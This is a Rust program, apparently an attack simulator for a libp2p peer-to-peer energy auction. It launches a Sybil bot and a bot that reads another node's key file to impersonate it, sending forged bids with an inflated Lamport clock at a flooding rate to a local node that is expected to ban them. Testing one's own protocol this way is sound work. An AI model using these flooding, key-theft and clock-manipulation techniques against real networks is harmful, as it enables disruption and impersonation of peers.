use libp2p::{gossipsub, noise, swarm::{NetworkBehaviour, SwarmEvent}, tcp, yamux, SwarmBuilder};
use libp2p::identity::Keypair;
use std::time::Duration;
use std::error::Error;
use tokio::time;
use futures::StreamExt; 

#[derive(NetworkBehaviour)]
pub struct EvilBehaviour {
    pub gossipsub: gossipsub::Behaviour,
}

// A reusable function to spawn as many hacker bots as we want!
async fn launch_hacker_bot(
    bot_name: String,
    id_keys: Keypair,
    target_addr: libp2p::Multiaddr,
    clock_payload: u64,
) {
    let local_peer_id = id_keys.public().to_peer_id();
    println!("🤖 [{}] Booting up. Peer ID: {}", bot_name, local_peer_id);

    let gossipsub_config = gossipsub::ConfigBuilder::default()
        .validation_mode(gossipsub::ValidationMode::Strict)
        .build()
        .expect("Valid config");

    let mut gossipsub_behaviour = gossipsub::Behaviour::new(
        gossipsub::MessageAuthenticity::Signed(id_keys.clone()),
        gossipsub_config,
    ).expect("Valid behaviour");

    let topic = gossipsub::IdentTopic::new("energy-auction");
    let _ = gossipsub_behaviour.subscribe(&topic);

    let behaviour = EvilBehaviour { gossipsub: gossipsub_behaviour };

    let mut swarm = SwarmBuilder::with_existing_identity(id_keys)
        .with_tokio()
        .with_tcp(tcp::Config::default(), noise::Config::new, yamux::Config::default).unwrap()
        .with_behaviour(|_| behaviour).unwrap()
        .with_swarm_config(|c| c.with_idle_connection_timeout(Duration::from_secs(60)))
        .build();

    println!("🎯 [{}] Dialing target Node A...", bot_name);
    if let Err(e) = swarm.dial(target_addr) {
        println!("❌ [{}] Failed to dial: {:?}", bot_name, e);
        return;
    }

    let mut spam_interval = time::interval(Duration::from_millis(100)); // 10 messages per second

    loop {
        tokio::select! {
            _ = spam_interval.tick() => {
                let fake_json = format!(
                    r#"{{"Commit":{{"auction_id":"ENERGY_AUCTION_001","lamport_clock":{},"bidder_id":"{}","commitment":"fake_hex"}}}}"#, 
                    clock_payload, local_peer_id
                );
                let _ = swarm.behaviour_mut().gossipsub.publish(topic.clone(), fake_json.as_bytes());
            }
            event = swarm.select_next_some() => {
                if let SwarmEvent::ConnectionEstablished { .. } = event {
                    println!("💣 [{}] CONNECTION SECURED! FIRING PAYLOADS!", bot_name);
                } else if let SwarmEvent::ConnectionClosed { .. } = event {
                    println!("💀 [{}] CONNECTION TERMINATED! Node A permanently banned us!", bot_name);
                    return; // The bot dies when the connection is severed
                }
            }
        }
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    println!("==================================================");
    println!(" 👿 BOOTING COORDINATED MULTI-VECTOR ATTACK 👿");
    println!("==================================================");

    let target_addr: libp2p::Multiaddr = "/ip4/127.0.0.1/tcp/8001".parse()?;

    // --- BOT 1: THE OUTSIDER (Sybil Attack) ---
    // Generates a random key, sends a normal clock (5)
    let random_keys = Keypair::generate_ed25519();
    let target_clone_1 = target_addr.clone();
    
    let bot1 = tokio::spawn(async move {
        launch_hacker_bot("SYBIL_BOT".to_string(), random_keys, target_clone_1, 5).await;
    });

    // --- BOT 2: THE INSIDER (Time-Jacking Attack) ---
    // Steals Node B's key, sends an overflow clock (999999999)
    let key_file = "meter_8002.key";
    let stolen_keys = if let Ok(bytes) = std::fs::read(&key_file) {
        Keypair::from_protobuf_encoding(&bytes).unwrap()
    } else {
        println!("❌ ERROR: Could not find {} to steal. Make sure you ran Node B at least once!", key_file);
        std::process::exit(1);
    };
    let target_clone_2 = target_addr.clone();

    let bot2 = tokio::spawn(async move {
        launch_hacker_bot("TIME_JACKER_BOT".to_string(), stolen_keys, target_clone_2, 999999999).await;
    });

    // Wait for both bots to get banned and killed by Node A
    let _ = tokio::join!(bot1, bot2);

    println!("==================================================");
    println!("🏁 ALL HACKER BOTS DEFEATED. SCRIPT SHUTTING DOWN.");
    println!("==================================================");
    
    Ok(())
}